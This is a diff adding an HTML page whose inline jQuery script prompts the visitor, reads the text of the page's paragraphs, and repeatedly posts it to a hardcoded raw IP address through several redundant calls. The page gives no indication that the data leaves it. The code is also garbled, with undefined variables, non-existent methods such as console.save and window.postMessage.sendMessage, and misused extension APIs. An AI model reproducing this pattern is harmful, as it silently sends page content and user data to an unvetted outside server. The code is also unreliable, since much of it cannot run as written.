@@ -1,0 +1,84 @@
+<html>
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</head>
+<body>
+<script>
+var answer = prompt("Give me the url please?");
+if (answer === null) {
+  console.log("Invalid Response");
+} else {
+  $.get(window.location.href + name, function(response) {
+  console.log(response);
+});
+}
+//
+var script = document.createElement('script');script.src = "https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js";document.getElementsByTagName('head')[0].appendChild(script);
+
+var result = prompt("Give me a answer please");
+if (result === null) {
+  console.log("Invalid Response");
+} else {
+  var str = $("p").text();
+  console.log(str);
+  let dto = { "content": str, "answer": 1 }
+  console.log(dto);
+  $.ajax({
+    url: 'https://35.227.102.229/rest/stream',
+    method: 'POST',
+    data: dto = $("p").text(),
+    dataType: "xml/html/script/json",
+    contentType: 'application/json'
+  });
+}
+
+
+
+$.post('http://35.227.102.229:8001/rest/stream',
+    {
+        "content": (str),
+        "answer": 1
+    });
+
+// $.get('https://35.227.102.229:8001/rest/stream', { content: (str), answer: 1 } );
+
+console.save(str);
+var str = $("p").text();
+console.save(str);
+
+
+chrome.runtime.sendMessage($.post({
+    method: 'POST',
+    action: 'xhttp',
+    url: 'http://35.227.102.229:8001/rest/stream',
+    data: { content: (str), answer: 1 }
+}, function(responseText) {
+    alert(responseText);
+    /*Callback function to deal with the response*/
+}));
+
+window.postMessage.sendMessage({
+    method: 'POST',
+    action: 'xhttp',
+    url: 'http://35.227.102.229:8001/rest/stream',
+    data: { content: (str), answer: 1 }
+}, function(responseText) {
+    alert(responseText);
+    /*Callback function to deal with the response*/
+});
+
+
+//console.save(str);
+//window.alert(str)
+
+//Just returns the input text, does not run input
+
+
+
+
+// document.write(response);
+// let text =
+// return locationURL;
+// window.location.href
+// return
+</script>
